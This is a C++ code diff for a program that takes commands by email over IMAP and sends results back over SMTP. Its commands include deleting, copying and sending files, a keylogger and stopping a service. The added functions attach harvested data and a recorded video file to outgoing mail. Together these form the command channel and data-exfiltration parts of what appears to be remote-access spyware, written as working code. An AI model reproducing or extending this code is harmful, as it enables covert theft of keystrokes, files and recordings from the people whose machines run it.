@@ -5,7 +5,7 @@
 // connect to the imap server
 imaps* createIMAPConnection() {
     try {
-		imaps* conn = new imaps(IMAP_SERVER, 993);
+		imaps* conn = new imaps(IMAP_SERVER, IMAP_PORT);
         conn->authenticate(SERVICE_MAIL_ADDRESS, SERVICE_MAIL_PASSWORD, imaps::auth_method_t::LOGIN);
         return conn;
     }
@@ -19,7 +19,7 @@ imaps* createIMAPConnection() {
 }
 
 // get the latest unread message
-bool getNewMessage(imaps& conn, message& msg) {
+bool getNewMail(imaps& conn, message& msg) {
     try {
 		// select the inbox folder
         conn.select("Inbox");
@@ -80,11 +80,10 @@ bool receivedNewCommand(imaps& conn, string& title, string& nameObject, string& 
     // set the line policy to mandatory, so longer lines could be parsed
     msg.line_policy(codec::line_len_policy_t::MANDATORY);
 
-	// if there is no new message, return false
-    if (!getNewMessage(conn, msg)) return false;
+	// if there is no new mail, return false
+    if (!getNewMail(conn, msg)) return false;
 
 	// get the message subject
-	//title = toLowerCase(msg.subject());
 	title = msg.subject();
     string body = getMessageTextBody(msg);
 
@@ -95,13 +94,69 @@ bool receivedNewCommand(imaps& conn, string& title, string& nameObject, string& 
         title == STOP_SERVICE ||
         title == SEND_FILE ||
         title == DELETE_FILE ||
-        title == KEY_LOGGER
+        title == KEYLOGGER
     ) {
 		nameObject = body;
     }
     else if (title == COPY_FILE) {
         stringstream ss(body);
-		getline(ss, source, '\n');
-		getline(ss, destination, '\n');
+		getline(ss, source, '\n'); // get the first line (source)
+		getline(ss, destination, '\n'); // get the second line (destination)
+        source = source.substr(0, source.size() - 1);
     }
+    return true;
+}
+
+// connect to the smtp server
+smtps* createSMTPConnection() {
+	try {
+		smtps* conn = new smtps(SMTP_SERVER, SMTP_PORT);
+        conn->authenticate(SERVICE_MAIL_ADDRESS, SERVICE_MAIL_PASSWORD, smtps::auth_method_t::START_TLS);
+        return conn;
+	}
+	catch (smtp_error& exc) {
+		cout << exc.what() << endl;
+	}
+	catch (dialog_error& exc) {
+		cout << exc.what() << endl;
+	}
+	exit(EXIT_FAILURE);
+}
+
+void createMessage(message& msg, string subject, string body) {
+    msg.from(mail_address(SERVICE_MAIL_NAME, SERVICE_MAIL_ADDRESS));
+    msg.add_recipient(mail_address(USER_MAIL_NAME, USER_MAIL_ADDRESS));
+    msg.subject(subject);
+    msg.content(body);
+}
+
+string extractFileName(string filePath) {
+	size_t found = filePath.find_last_of("/\\");
+	return filePath.substr(found + 1);
+}
+
+void attachFile(message& msg, string fileName) {
+    ifstream ifs("receivedData.bin", ios::binary);
+    list<tuple<std::istream&, string_t, message::content_type_t>> atts;
+    atts.push_back(make_tuple(ref(ifs), fileName, message::content_type_t(message::media_type_t::APPLICATION, "octet-stream")));
+    msg.attach(atts);
+}
+
+void attachVideo(message& msg, string fileName) {
+    ifstream ifs("record.mp4", ios::binary);
+    list<tuple<std::istream&, string_t, message::content_type_t>> atts;
+    atts.push_back(make_tuple(ref(ifs), fileName, message::content_type_t(message::media_type_t::APPLICATION, "octet-stream")));
+    msg.attach(atts);
+}
+
+void sendMail(smtps& conn, message& msg) {
+	try {
+		conn.submit(msg);
+	}
+	catch (smtp_error& exc) {
+		cout << exc.what() << endl;
+	}
+	catch (dialog_error& exc) {
+		cout << exc.what() << endl;
+	}
 }
